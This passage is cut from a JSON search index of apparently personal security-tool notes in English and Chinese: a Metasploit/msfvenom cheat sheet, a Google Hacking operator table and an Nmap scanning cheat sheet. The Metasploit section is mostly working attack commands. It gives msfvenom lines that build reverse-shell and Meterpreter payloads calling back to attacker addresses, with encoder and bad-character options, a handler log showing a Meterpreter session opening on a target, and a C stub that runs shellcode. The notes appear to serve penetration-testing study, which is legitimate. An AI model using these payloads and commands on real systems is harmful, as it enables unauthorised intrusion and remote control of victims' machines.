LHOST 192.168... msf&gt; set LPORT ... msf&gt; set PAYLOAD windows\/... msf&gt; exploit set global parameter msf&gt; setg RHOSTS 192.168... database services msf&gt; hosts msf&gt; db_nmap 192.168.31.200-254 --top-ports 20 msf&gt; services -p 443 # print all machine open 443 port modules Auxiliary msf &gt; show auxiliary Exploits MSFVenom cheatsheet msfvenom --list payloads | grep linux | grep x64 \/\/ search payloads msfvenom -p linux\/x64\/exec --list-options \/\/ list options \/\/ generate full interactive reverse shell msfvenom -p linux\/x64\/meterpreter\/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin overview msfvenom -p windows\/shell_reverse_tcp \\ LHOST=192.168.30.5 \\ LPORT=443 \\ -f c \\ -a x86 \\ --platform windows \\ -b &quot;\\x00\\x0a\\x0d&quot; \\ -e x86\/shikata_ga_nai \\ EXITFUNC=thread \u6ce8\u610f\u9019\u500b\u751f\u6210\u7684 shellcode \u6703\u9700\u8981\u7528\u5230 stack \u81ea\u6211\u89e3\u58d3\u7e2e \uff0c\u5982\u679c shellcode \u653e\u5728 stack \u4e2d(ESP\u6307\u5411\u4f4d\u7f6e)\uff0c\u8981\u8a18\u5f97\u5728\u6700\u524d\u982d\u585e nop EXITFUNC thread: This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application\/system (clean exit) process: This method should be used with multi\/handler. This method should also be used with any exploit where a master process restarts it on exit. seh: This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs. shellcode note msfvenom command cheat sheet Useful Payload use windows\/meterpreter\/reverse_https use windows\/meterpreter\/reverse_tcp_allports Payload staged\/non-staged msfvenom -p &lt;payload&gt; -f &lt;format&gt; LHOST= LPORT= -e &lt;encoder&gt; -b &lt;bad-chars&gt; # -e x86\\shikata_ga_nai msfvenom \u2013list payload staged payload Metasploit exploit\/multi\/handler windows\/shell\/reverse_tcp non-staged payload nc -nvlp [port] windows\/shell_reverse_tcp (sent in its entirety in one go) windows\/shell\/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged) windows\/shell_reverse_tcp - Connect back to attacker and spawn a command shell example: using staged payload msf6 &gt; use exploit\/multi\/handler [*] Using configured payload generic\/shell_reverse_tcp msf6 exploit(multi\/handler) &gt; set lhost 10.10.14.12 lhost =&gt; 10.10.14.12 msf6 exploit(multi\/handler) &gt; set lport 7702 lport =&gt; 7702 msf6 exploit(multi\/handler) &gt; set payload linux\/x64\/meterpreter\/reverse_tcp payload =&gt; linux\/x64\/meterpreter\/reverse_tcp msf6 exploit(multi\/handler) &gt; run msfvenom -p linux\/x64\/meterpreter\/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin \/\/ generate upload &amp; execute [*] Started reverse TCP handler on 10.10.14.12:7702 [*] Sending stage (3008420 bytes) to 10.10.10.61 [*] Meterpreter session 1 opened (10.10.14.12:7702 -&gt; 10.10.10.61:46986) at 2020-11-14 21:02:55 +0800 meterpreter &gt; ls test payload format \u9078 -f c #include &lt;stdio.h&gt; unsigned char buf[] = &quot;&quot; int main() { void (*f)() = (void (*)()) buf; f(); return 0; } \u7de8\u8b6f gcc -m32 -z execstack Meterpreter Online Resources METERPRETER BASIC COMMANDS Commands execute meterpreter &gt; execute -f bash -i -f &lt;opt&gt; The executable command to run. -i Interact with the process after creating it. -a &lt;opt&gt; The arguments to pass to the command. -c Channelized I\/O (required for interaction).","tags":"","url":"Misc_Tools\/Tools_Metasploit.html"},{"title":"Tools-Google Hacking","text":"Google Hacking Table of Contents Google Hacking tags: Security Tools Alternate query types \u5099\u4efd\u67e5\u8a62\u985e\u578b cache link related info Other define Query modifiers \u67e5\u8a62\u4fee\u98fe\u7b26 site intext intitle inurl Filetype Advanced operators tags: Security Tools Alternate query types \u5099\u4efd\u67e5\u8a62\u985e\u578b cache cache:www.csie.fju.edu.tw \u67e5\u8a62\u67d0\u7db2\u9801\u5728google\u4e2d\u7684cache link link:www.csie.fju.edu.tw \u67e5\u8a62\u6240\u6709\u548c\u7db2\u9801\u6709\u9023\u7d50\u7684\u7db2\u9801 related related:www.csie.fju.edu.tw \u5217\u51fa\u6240\u6709\u548c\u67e5\u8a62\u7db2\u9801\u985e\u4f3c\u7684\u7db2\u9801 info info:hoschoc.com \u5217\u51fa\u67d0\u7db2\u7ad9\u5728Google\u4e0a\u5b58\u6709\u54ea\u4e9b\u8cc7\u8a0a Other define define:\u8d6b\u863f \u5c0b\u627e\u67d0\u5b57\u8a5e\u5728\u7db2\u8def\u4e0a\u7684\u5b9a\u7fa9 Query modifiers \u67e5\u8a62\u4fee\u98fe\u7b26 site Usage:&quot;\u95dc\u9375\u5b57 site:\u7db2\u5740&quot; \u67e5\u8a62\u6307\u5b9a\u7db2\u7ad9\u5167\u7684\u7db2\u9801 site:tw \u4e5f\u53ef\u4ee5\u6307\u5b9a\u570b\u7c4d intext Intext:\u53f0\u7063 \u53ea\u60f3\u5728\u7db2\u9801\u5167\u6587\u4e2d\u5c0b\u627e\u8cc7\u6599 intitle \u53ea\u60f3\u5728\u7db2\u9801\u6a19\u984c\u4e2d\u5c0b\u627e\u8cc7\u6599 inurl \u5c0b\u627e\u6307\u5b9a\u7684\u5b57\u4e32\u5728\u7db2\u5740\u5217\u7576\u4e2d Filetype filetype:pdf filetype:mp3 Advanced operators Operator Purpose Mixes with Other Operators? Can be used Alone? Web Images Groups News intitle Search page Title yes yes yes yes yes yes allintitle Search page title no yes yes yes yes yes inurl Search URL yes yes yes yes not really like intitle allinurl Search URL no yes yes yes yes like intitle filetype specific files yes no yes yes no not really intext Search text of page only yes yes yes yes yes yes allintext Search text of page only not really yes yes yes yes yes site Search specific site yes yes yes yes no not really link Search for links to pages no yes yes no no not really inanchor Search link anchor text yes yes yes yes not really yes numrange Locate number yes yes yes no no not really daterange Search in date range yes no yes not really not really not really author Group author search yes yes no no yes not really group Group name search not really yes no no yes not really insubject Group subject search yes yes like intitle like intitle yes like intitle msgid Group msgid search no yes not really not really yes not really","tags":"","url":"Misc_Tools\/Tools_Google_Hacking.html"},{"title":"Tools-Nmap","text":"Nmap Table of Contents Nmap tags: Security Tools Cheet sheet Initial Scan Vulnerable Scan Others Parameters Output speed Guide Dealing with Misidentified and Unidentified Hosts Updater for Nmap\u2019s architecture-independent files tags: Security Tools Cheet sheet Initial Scan nmap -p- -vvv -oN nmap.scan_all_port.log {{target}} nmap -A -sC -sV -oN nmap.initial.log {{target}} cat nmap.scan_all_port.log | grep &quot;^[0-9]&quot; | awk -v FS=&quot;\/&quot; '{print $1}' | tr '\\n' ',' | sed s\/,$\/\/ ports=$(nmap -p- --min-rate=1000 -T4 {{target}} | grep &quot;^[0-9]&quot; | cut -d '\/' -f 1 | tr '\\n' ',' | sed s\/,$\/\/) nmap -sC -sV -p $ports {{target}} tip: sleep 300; Vulnerable Scan nmap --script &quot;vuln&quot; -oN nmap.vulnscan.log {{target}} nmap --script=&quot;smb-vuln*&quot; -p 139, 445 -v -oN nmap.vulnscan.smb.log {{target}} Others nmap -p- -sT {{target}} nmap -sT -sV -A -O -p 1-65535 {{target}} Parameters -A Enable OS detection (need sudo), version detection, script scanning, and traceroute Output -oA {{filename}} Output in the three major formats at once -oN {{filename}} Output scan in normal format speed -T paranoid(0)|sneaky(1)|polite(2)|normal(3)|aggressive(4)|insane(5) Set a timing template --min-rate {{number}} --max-rate {{number}} --min-rate 300 means that Nmap will try to keep the sending rate at or above 300 packets per second. -sn # Ping Scan - disable port scan -sT(TCP) | -sU(UDP) | -sY(SCTP INIT) | -sA(TCP ACK) -sN(Null) | -sF(FIN) | -sX(Xmas) --top-ports={{number}} # \u6383\u63cf\u524d {{number}} \u5e38\u7528\u7684 port -sV # enumerate versions -sC --script=default # run safe scripts -Pn # skip host discovery -p {{port}} {{ranges}} # -p 139,445 # -p 1-65535 == -p - # \u7bc4\u570d\u7684\u982d\u5c3e\u5982\u679c\u662f 1\/65535 \u53ef\u7701\u7565 # -p U:53,111,137,T:21-25,80 # T: for TCP, U: for UDP, S: for SCTP, or P: for IP Protocol --open # show only open ports -v | -vv | -vvv verbosity level Guide Dealing with Misidentified and Unidentified Hosts \u5982\u679c\u6c92\u8fa6\u6cd5\u6e96\u78ba\u7684\u5075\u6e2c OS\uff0c\u6709\u5e7e\u500b\u505a\u6cd5\uff1a \u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c \u6383\u63cf\u66f4\u591a port z.B. -p- \u6383\u63cf\u5168\u90e8\u7684 port \u6216 -sU \u52a0\u4e0a UDP Scan \u4f7f\u7528\u66f4\u7a4d\u6975\u7684\u731c\u6e2c \u6709\u4e9b\u6642\u5019\u6703\u56e0\u70ba\u9632\u706b\u7246\u4e4b\u985e\u7684\u554f\u984c\u5f97\u5230\u4e0d\u540c\u7684\u7d50\u679c \u52a0\u4e0a --osscan-guess \u53c3\u6578 \u63db\u500b\u5730\u65b9\u9032\u884c\u5075\u6e2c Updater for Nmap\u2019s architecture-independent files \u56e0\u70ba nselib \u548c nse scripts \u5e38\u5e38\u9700\u8981\u66f4\u65b0\uff0c\u6240\u4ee5\u6211\u73fe\u5728\u7684\u505a\u6cd5\u5c31\u662f\u76f4\u63a5 clone nmap \u7684 GitHub \u4e0b\u4f86\uff0clink nselib \u548c scripts \u5230 \/usr\/share\/nmap (\u628a\u539f\u672c\u7684 mv \u5230 *.old) \u53e6\u5916\u5728 manual \u6709\u770b\u5230\u4e00\u500b\u53eb\u505a nmap-update \u7684\u6771\u897f\u770b\u8d77\u4f86\u662f\u6211\u8981\u7684\uff0c\u4f46\u76ee\u524d (7.80) \u4f3c\u4e4e\u9084\u6c92\u6709\u9019\u500b\u529f\u80fd","tags":"","url":"Misc_Tools\/Tools_Nmap.html"}]});